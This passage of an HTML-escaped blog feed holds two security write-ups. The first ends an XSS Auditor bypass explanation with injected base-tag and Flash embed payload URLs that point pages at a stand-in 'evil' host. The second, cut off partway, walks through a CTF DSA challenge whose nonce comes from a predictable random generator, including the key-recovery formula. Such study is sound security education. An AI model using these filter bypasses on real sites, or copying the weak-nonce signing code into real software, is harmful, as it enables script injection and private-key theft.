&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+src=http://localhost:1313/aaa&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed src=http://localhost:1313/aaa&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;如果我们能改变基础URL，就有可能实现XSS攻击。base标签通常也会被拦截，但如果它没有用&lt;code&gt;&amp;gt;&lt;/code&gt;闭合，在某些情况下Auditor不会拦截。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以下情况会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=3&amp;amp;q=&amp;lt;base+href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;base href=//evil/ &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;但以下情况不会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;base+href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;base href=//evil/&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;区别在于前者在注入点后有一个空格。看起来如果页面在注入点后直接有空格，Auditor会拦截。换句话说，如果页面在注入点后没有直接的空格，我们就可以注入base标签而不被拦截。&lt;/p&gt;
&lt;p&gt;因此，我的攻击向量有效！&lt;/p&gt;
&lt;h2 id=&#34;其他绕过方法&#34;&gt;其他绕过方法
&lt;/h2&gt;&lt;p&gt;如果注入点后有空格，我们还有机会绕过。如果注入点下方存在&lt;code&gt;&amp;quot;&lt;/code&gt;字符，我们可以使用未闭合的属性引号来绕过Auditor，如&lt;code&gt;&amp;lt;base href=&amp;quot;//evil/&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;以下情况不会被拦截：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=4&amp;amp;q=&amp;lt;embed+allowscriptaccess=always+src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base+href=&amp;#34;//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed allowscriptaccess=always src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base href=&amp;#34;//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/div&amp;gt;&amp;lt;div id=&amp;#34;x&amp;#34;&amp;gt;AAA&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个绕过方法很有用，因为大多数页面在注入点下方都有&lt;code&gt;&amp;quot;&lt;/code&gt;字符。&lt;/p&gt;
&lt;p&gt;另外，&lt;code&gt;&amp;lt;script src=http://localhost:1313/xss.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;base href=//evil/&lt;/code&gt;也不会被拦截。但我们无法加载外部资源，因为在设置base URL之前就开始加载了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=%3Cscript%20src=http://localhost:1313/xss.js%3E%3C/script%3E%3Cbase%20href=//evil/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因此，我使用了Flash来实现攻击。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;这就是全部内容。感谢阅读我的文章！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>破解CSAW CTF加密挑战：DSA签名漏洞分析</title>
        <link>http://localhost:1313/p/%E7%A0%B4%E8%A7%A3csaw-ctf%E5%8A%A0%E5%AF%86%E6%8C%91%E6%88%98dsa%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 22:18:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%A0%B4%E8%A7%A3csaw-ctf%E5%8A%A0%E5%AF%86%E6%8C%91%E6%88%98dsa%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;csaw-ctf-crypto-challenge-breaking-dsa&#34;&gt;CSAW CTF Crypto Challenge: Breaking DSA
&lt;/h1&gt;&lt;p&gt;Trail of Bits密码学服务团队为最近的CSAW CTF贡献了两道密码学挑战。今天我们将解析其中较简单的一道，题目名为&amp;quot;灾难性安全设备——祝你好运，&amp;lsquo;k？&amp;quot;。&lt;/p&gt;
&lt;p&gt;这道题目涉及数字签名算法(DSA)，展示了表面安全的算法如何通过实现细节变得完全不安全。该挑战利用了两种漏洞，其中一个是PlayStation 3固件破解的根源，另一个则是无数软件产品中常见的安全漏洞来源。&lt;/p&gt;
&lt;h2 id=&#34;获取旗帜&#34;&gt;获取旗帜
&lt;/h2&gt;&lt;p&gt;参赛者获得了源代码(main.py)和一个可交互的HTTP服务器。该服务器模拟在线签名服务，包含以下端点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/public_key&lt;/code&gt;：返回DSA公钥元素(p,q,g,y)的JSON编码整数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/sign/&lt;/code&gt;：对数据进行SHA1哈希后使用DSA私钥签名，返回两个整数(r,s)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/forgotpass&lt;/code&gt;：使用random.getrandbits生成密码重置URL&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/resetpass&lt;/code&gt;：未实现的端点，调用返回500&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/challenge&lt;/code&gt;：返回有效的Fernet令牌&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/capture&lt;/code&gt;：当提供有效的Fernet令牌的DSA签名时，返回旗帜&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dsa签名机制剖析&#34;&gt;DSA签名机制剖析
&lt;/h2&gt;&lt;p&gt;完整的DSA密钥包含5个值：p,q,g,x和y。其中x是私钥值，我们需要恢复它。DSA签名的计算过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;选择随机数k(0 &amp;lt; k &amp;lt; q)&lt;/li&gt;
&lt;li&gt;计算r = (g^k mod p) mod q&lt;/li&gt;
&lt;li&gt;计算k的模逆kinv：(k * kinv) % q = 1&lt;/li&gt;
&lt;li&gt;计算消息的SHA1哈希h&lt;/li&gt;
&lt;li&gt;计算s = (kinv * (h + r * x)) % q&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;服务器中的签名实现如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sign&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctf_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DSAPrivateKeyWithSerialization&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;pn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctf_key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;private_numbers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parameter_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parameter_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parameter_numbers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;randrange&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;kinv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_modinv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hashlib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;big&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kinv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;数学漏洞利用&#34;&gt;数学漏洞利用
&lt;/h2&gt;&lt;p&gt;从签名方程s = (kinv * (h + r * x)) % q出发，我们可以解出私钥x：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;x = (rinv * ((s * k) - h)) % q
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键在于预测随机数k的值。服务器使用Python的random模块(基于梅森旋转算法)生成k，这不是密码学安全的随机数生成器。&lt;/p&gt;
&lt;h2 id=&#34;随机数生成器攻击&#34;&gt;随机数生成器攻击
&lt;/h2&gt;&lt;p&gt;通过调用&lt;code&gt;/forgotpass&lt;/code&gt;端点，我们可以获取梅森旋转算法的输出：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/forgotpass&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;returnrand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;random_value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexlify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;Q&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://innitech.local/resetpass/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random_value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span 